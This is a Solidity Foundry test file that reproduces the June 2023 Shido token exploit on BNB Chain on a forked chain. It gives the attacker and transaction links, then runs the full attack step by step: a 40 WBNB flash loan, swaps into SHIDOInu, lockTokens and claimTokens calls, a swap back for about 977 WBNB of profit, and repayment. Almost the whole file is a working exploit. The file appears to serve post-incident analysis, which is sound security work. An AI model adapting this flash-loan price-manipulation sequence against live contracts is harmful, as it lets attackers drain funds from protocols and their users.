// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~977 WBNB
// Attacker : https://bscscan.com/address/0x69810917928b80636178b1bb011c746efe61770d
// Attack Contract : https://bscscan.com/address/0xcdb3d057ca0cfdf630baf3f90e9045ddeb9ea4cc
// Attack Tx : https://bscscan.com/tx/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1672473343734480896

interface IShidoLock {
    function lockTokens() external;

    function claimTokens() external;
}

contract ShidoTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 SHIDOInu = IERC20(0x733Af324146DCfe743515D8D77DC25140a07F9e0);
    // SHIDO Standard Token
    IERC20 SHIDO = IERC20(0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    Uni_Router_V2 PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V2 AddRemoveLiquidityForFeeOnTransferTokens = Uni_Router_V2(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IShidoLock ShidoLock = IShidoLock(0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_365_171);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(SHIDOInu), "SHIDOInu");
        cheats.label(address(SHIDO), "SHIDO");
        cheats.label(address(DPPAdvanced), "DPPAdvanced");
        cheats.label(address(PancakeRouter), "PancakeRouter");
        cheats.label(address(AddRemoveLiquidityForFeeOnTransferTokens), "AddRemoveLiquidityForFeeOnTransferTokens");
        cheats.label(address(ShidoLock), "ShidoLock");
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Start] WBNB amount before attack", WBNB.balanceOf(address(this)), WBNB.decimals());
        // Step 1. Borrow flash loan (40 WBNB)
        DPPAdvanced.flashLoan(40e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] WBNB amount after attack", WBNB.balanceOf(address(this)), WBNB.decimals());
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // Approvals
        WBNB.approve(address(PancakeRouter), type(uint256).max);
        SHIDOInu.approve(address(AddRemoveLiquidityForFeeOnTransferTokens), type(uint256).max);
        SHIDOInu.approve(address(ShidoLock), type(uint256).max);
        SHIDO.approve(address(PancakeRouter), type(uint256).max);

        // Step 2. Swap WBNB (39 WBNB, 18 decimals) to obtain SHIDOInu tokens (9 decimals)
        swapWBNBToSHIDOInu(39e18, address(AddRemoveLiquidityForFeeOnTransferTokens));
        WBNB.withdraw(10e15);
        swapWBNBToSHIDOInu(100e15, address(this));

        AddRemoveLiquidityForFeeOnTransferTokens.addLiquidityETH{value: 0.01 ether}(
            address(SHIDOInu), 1e9, 1, 1, address(this), block.timestamp + 100
        );

        // Step 3. Sequentially invoke lockTokens() and claimTokens() to convert SHIDOInu to standard SHIDO tokens (18 decimals)
        ShidoLock.lockTokens();
        ShidoLock.claimTokens();

        // Step 4. Swap all SHIDO tokens to WBNB. Due to price difference between pools attacker has gained ~977 WBNB tokens
        swapSHIDOToWBNB();

        // Step 5. Repay flashloan
        WBNB.transfer(address(DPPAdvanced), baseAmount);
    }

    function swapWBNBToSHIDOInu(uint256 amountIn, address to) internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHIDOInu);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 20, path, to, block.timestamp + 100
        );
    }

    function swapSHIDOToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(SHIDO);
        path[1] = address(WBNB);
        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHIDO.balanceOf(address(this)), 500e18, path, address(this), block.timestamp + 100
        );
    }

    receive() external payable {}
}
